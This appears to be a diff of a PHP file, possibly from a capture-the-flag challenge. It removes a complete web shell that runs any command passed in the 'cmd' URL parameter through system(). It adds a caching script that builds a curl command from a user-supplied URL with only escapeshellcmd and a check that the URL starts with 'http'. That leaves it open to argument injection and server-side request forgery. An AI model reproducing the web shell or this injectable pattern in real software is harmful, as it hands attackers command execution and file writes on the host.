@@ -1,16 +1,15 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
+if(isset($_GET['url'])){
+    $url = $_GET['url'];
+    if(strpos($url, 'http') !== 0 ){
+        die('http only !');
+    }else{
+        $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
+        $cache_file = './cache/'.md5($url);
+        file_put_contents($cache_file, $result);
+        echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
+        echo '<pre>'. htmlentities($result) .'</pre>';
+        return;
     }
+}else{
 ?>
-</pre>
-</body>
-</html>
